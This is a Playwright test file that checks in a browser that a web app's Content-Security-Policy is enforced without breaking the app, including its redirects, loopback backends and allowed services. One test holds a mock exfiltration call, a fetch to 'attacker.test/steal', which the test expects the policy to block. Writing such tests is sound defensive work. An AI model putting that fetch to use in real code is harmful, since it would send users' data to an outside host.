import { expect, test } from '@playwright/test';

/**
 * The Content-Security-Policy, checked in a browser rather than read.
 *
 * There was no CSP at all: X-Frame-Options, nosniff and Referrer-Policy say
 * nothing about where the page may load code from or send data to.
 *
 * Asserting the header string would only prove the header is present. What
 * matters is whether the browser enforces it, and whether it enforces so much
 * that the app stops working — so these load real pages, watch for violations,
 * and try one thing that must be blocked and one that must not be.
 */

const CSP_VIOLATION = /violates the following Content Security Policy/i;

/**
 * Every route a browser can land on, including the ones that redirect.
 *
 * The first version of this list stopped at the public pages, on the reasoning
 * that /dashboard/* redirects to /login and so had nothing new to exercise.
 * That reasoning is what let a broken policy through: `upgrade-insecure-requests`
 * rewrote the redirect itself into an https URL the server does not speak, and
 * the viewer hung. The redirect was the untested part, and so was the WebGL
 * canvas behind it.
 */
const PAGES = ['/', '/demo', '/login', '/signup', '/dashboard', '/dashboard/viewer'];

test.describe('Content-Security-Policy', () => {
  test('is served on every response', async ({ page }) => {
    const response = await page.goto('/');
    const csp = response?.headers()['content-security-policy'];

    expect(csp, 'no CSP header').toBeTruthy();
    // The directives that decide whether this is a control or decoration.
    expect(csp).toContain("default-src 'self'");
    expect(csp).toContain("object-src 'none'");
    expect(csp).toContain("base-uri 'self'");
    expect(csp).toContain("frame-ancestors 'self'");
    expect(csp).toContain('connect-src');
  });

  for (const path of PAGES) {
    test(`${path} settles with no CSP violation`, async ({ page }) => {
      const violations: string[] = [];
      page.on('console', (message) => {
        if (CSP_VIOLATION.test(message.text())) violations.push(message.text());
      });

      await page.goto(path, { waitUntil: 'networkidle' }).catch(() => {
        // A refused connection to a backend that is not running is not this
        // test's business; a CSP violation is, and it lands in `violations`.
      });

      expect(violations, `CSP blocked something ${path} needs`).toEqual([]);
    });
  }

  test('keeps http loopback usable, in both spellings', async ({ page }) => {
    /**
     * Two separate mistakes made the first version of this policy hang
     * /dashboard/viewer for 30 s, and each hid the other.
     *
     * `upgrade-insecure-requests` rewrote every http URL to https, including
     * the app's own redirect to /login, against a server with no TLS.
     *
     * Underneath it, `'self'` matches an origin exactly, and 127.0.0.1 is not
     * localhost. Served from 127.0.0.1:3100, the middleware's redirect came
     * back as localhost:3100 and connect-src refused the router's fetch of it.
     *
     * Both are asserted on the header, not by watching for the symptom: the
     * symptom was a timeout, which is slow to observe and easy to misattribute
     * — it took an A/B against a build with no CSP at all to pin it down.
     */
    const response = await page.goto('/');
    const csp = response?.headers()['content-security-policy'] ?? '';

    expect(csp, 'http URLs would be forced to https').not.toContain(
      'upgrade-insecure-requests',
    );
    for (const loopback of ['http://localhost:*', 'http://127.0.0.1:*']) {
      expect(csp, `${loopback} must stay reachable`).toContain(loopback);
    }
  });

  test('blocks a third-party script', async ({ page }) => {
    await page.goto('/');

    const blocked = await page.evaluate(async () => {
      return new Promise<boolean>((resolve) => {
        const script = document.createElement('script');
        script.src = 'https://cdn.jsdelivr.net/npm/lodash@4/lodash.min.js';
        script.onerror = () => resolve(true);
        script.onload = () => resolve(false);
        document.head.appendChild(script);
        setTimeout(() => resolve(false), 5000);
      });
    });

    expect(blocked, 'a CDN script loaded — script-src is not restricting origins').toBe(
      true,
    );
  });

  test('blocks a fetch to an origin that is not allowed', async ({ page }) => {
    const violations: string[] = [];
    page.on('console', (message) => {
      if (CSP_VIOLATION.test(message.text())) violations.push(message.text());
    });

    await page.goto('/');
    await page.evaluate(async () => {
      await fetch('https://attacker.test/steal', { mode: 'no-cors' }).catch(() => undefined);
    });

    expect(
      violations.some((text) => text.includes('attacker.test')),
      'connect-src did not stop an exfiltration target',
    ).toBe(true);
  });

  test('still allows the origins the app actually calls', async ({ page }) => {
    /**
     * The failure this guards against is a CSP tightened until the product
     * breaks. `resolveBackend()` sends analyses to a trycloudflare host or to
     * 127.0.0.1:8000, and auth goes to Supabase. None of those is running in
     * this test, so a network error is the expected outcome — what must not
     * appear is a CSP refusal, which the browser reports differently.
     */
    const violations: string[] = [];
    page.on('console', (message) => {
      if (CSP_VIOLATION.test(message.text())) violations.push(message.text());
    });

    await page.goto('/');
    await page.evaluate(async () => {
      const targets = [
        'https://example-tunnel.trycloudflare.com/health',
        'http://127.0.0.1:8000/health',
        'https://example-project.supabase.co/auth/v1/user',
      ];
      await Promise.all(
        targets.map((url) => fetch(url, { mode: 'no-cors' }).catch(() => undefined)),
      );
    });

    expect(violations, 'CSP is blocking a backend the app is built to call').toEqual([]);
  });
});
